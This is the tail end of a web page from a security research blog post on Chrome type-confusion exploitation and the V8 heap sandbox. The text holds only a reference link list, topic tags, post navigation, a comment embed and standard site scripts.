<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://jhalon.github.io/chrome-browser-exploitation-3/">https://jhalon.github.io/chrome-browser-exploitation-3/</a></p>
<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://v8.dev/blog/sandbox">https://v8.dev/blog/sandbox</a></p>
<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/">https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/</a></p>
<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://saelo.github.io/presentations/offensivecon_24_the_v8_heap_sandbox.pdf">https://saelo.github.io/presentations/offensivecon_24_the_v8_heap_sandbox.pdf</a></p>
<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://m.blog.naver.com/funraon/223669595583">https://m.blog.naver.com/funraon/223669595583</a></p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                <div class="post-meta mr-3">
                  <i class="iconfont icon-category"></i>
                  
                  <a class="hover-with-bg" href="/categories/Research/">Research</a>
                  
                </div>
                
                
                <div class="post-meta">
                  <i class="iconfont icon-tags"></i>
                  
                  <a class="hover-with-bg" href="/tags/OUYA77/">OUYA77</a>
                  
                  <a class="hover-with-bg" href="/tags/RCE/">RCE</a>
                  
                  <a class="hover-with-bg" href="/tags/pwnable/">pwnable</a>
                  
                  <a class="hover-with-bg" href="/tags/Type-Confusion/">Type Confusion</a>
                  
                  <a class="hover-with-bg" href="/tags/Chrome/">Chrome</a>
                  
                  <a class="hover-with-bg" href="/tags/Chromium/">Chromium</a>
                  
                  <a class="hover-with-bg" href="/tags/CVE-2018-17463/">CVE-2018-17463</a>
                  
                  <a class="hover-with-bg" href="/tags/Heap-Sandbox/">Heap Sandbox</a>
                  
                </div>
                
              </div>

              <div class="post-metas mb-3">
                <a class="hover-with-bg" style="display: flex;" href="/author">
                  <div class="link-avatar-page">
                    <img src="/img/profile_OUYA77.jpg" srcset="/img/loading.gif" alt="OUYA77">
                  </div>

                  <div class="link-text">
                    <div class="link-title">OUYA77</div>
                  </div>
                </a>
                <div class="link-text">
                  <div class="link-more">
                    <a href="/tags/OUYA77">
                      Read more
                      <i class="iconfont icon-arrowdown"></i>
                    </a>
                  </div>
                </div>
              </div>

              <hr>
              <!--<script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
              
              <!--  -->
              <p class="note note-warning">본 글은 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.ko" rel="external nofollow noopener noreferrer">CC BY-SA 4.0</a> 라이선스로 배포됩니다. 공유 또는 변경 시 반드시 출처를 남겨주시기 바랍니다.</p>
              
              
              
              <div class="post-prevnext row">
                <article class="post-prev col-6">
                  
                  
                  <a href="/2025/10/11/banda/CVE-2025-61882/">
                    <i class="iconfont icon-arrowleft"></i>
                    <span class="hidden-mobile">[하루한줄] CVE-2025-61882: Oracle E-Business Suite에서 발생한 연쇄 취약점으로 인한 RCE (CRLF Injection 등)</span>
                    <span class="visible-mobile">Previous</span>
                  </a>
                  
                </article>
                <article class="post-next col-6">
                  
                  
                  <a href="/2025/10/10/OUYA77/Chrome_part4/kr/">
                    <span class="hidden-mobile">[Research] Type Confusion 101으로 시작하는 Chrome Exploit ^-^☆Part 4.(KR)</span>
                    <span class="visible-mobile">Next</span>
                    <i class="iconfont icon-arrowright"></i>
                  </a>
                  
                </article>
              </div>
              
            </div>
            
            <!-- Embed Section -->
            <div style="width: 100%; height: 210px; margin-bottom: 50px; overflow: hidden;">
              <iframe src="https://maily.so/hackyboiz/embed?src=embed" style="width: 100%; height: 100%; border: none;" frameborder="0"></iframe>
            </div>            

            
            <!-- Comments -->
            <article class="comments" id="comments">
              
              
  <div class="disqus" style="width:100%">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
      var disqus_config = function () {
        this.page.url = 'https://hackyboiz.github.io/2025/10/10/OUYA77/Chrome_part4/en/';
        this.page.identifier = '/2025/10/10/OUYA77/Chrome_part4/en/';
      };
      function loadDisqus() {
        (function () {
          var d = document,
            s = d.createElement('script');
          s.src = '//' + 'hackyboiz' + '.disqus.com/embed.js';
          s.setAttribute('data-timestamp', new Date());
          (d.head || d.body).appendChild(s);
        })();
      }
      waitElementVisible('disqus_thread', loadDisqus);
    </script>
    <noscript>Please enable JavaScript to view the
      <a target="_blank" href="https://disqus.com/?ref_noscript" rel="external nofollow noopener noreferrer">comments powered by Disqus.</a>
    </noscript>
  </div>


            </article>
            
          </article>
        </div>
      </div>
    </div>
    
    <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
      <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div id="tocbot"></div>
</div>

    </div>
    
  </div>
</div>

<!-- Custom -->

    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="external nofollow noopener noreferrer"><span>Hexo</span></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="external nofollow noopener noreferrer">
        <span>Fluid</span></a>
    </div>
    

    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
<script src="/js/debouncer.js"></script>
<script src="/js/main.js"></script>

<!-- Plugins -->


  
    <script src="/js/lazyload.js"></script>
  



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
  <script src="/js/clipboard-use.js"></script>







  <script src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js"></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '#post-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>



  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "[Research] Starting Chrome Exploitation with Type Confusion 101 ^-^☆ Part 4.(EN)&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/js/local-search.js"></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>





  

  
    <!-- MathJax -->
    <script>
      MathJax = {
        tex: {
          inlineMath: [['$', '$'], ['\\(', '\\)']]
        },
        options: {
          renderActions: {
            findScript: [10, doc => {
              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
                const display = !!node.type.match(/; *mode=display/);
                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
                const text = document.createTextNode('');
                node.parentNode.replaceChild(text, node);
                math.start = { node: text, delim: '', n: 0 };
                math.end = { node: text, delim: '', n: 0 };
                doc.math.push(math);
              });
            }, '', false],
            insertedScript: [200, () => {
              document.querySelectorAll('mjx-container').forEach(node => {
                let target = node.parentNode;
                if (target.nodeName.toLowerCase() === 'li') {
                  target.parentNode.classList.add('has-jax');
                }
              });
            }, '', false]
          }
        }
      };
    </script>

    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>

  













  

  
    <!-- Google Analytics -->
    <script defer>
      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
      ga.l = +new Date;
      ga('create', 'UA-177243668-2', 'auto');
      ga('send', 'pageview');
    </script>
    <script async src="https://www.google-analytics.com/analytics.js"></script>
  

  
    <!-- Google gtag.js -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-177243668-2"></script>
    <script defer>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-177243668-2');
    </script>
  

  

  

  





</body>
</html>
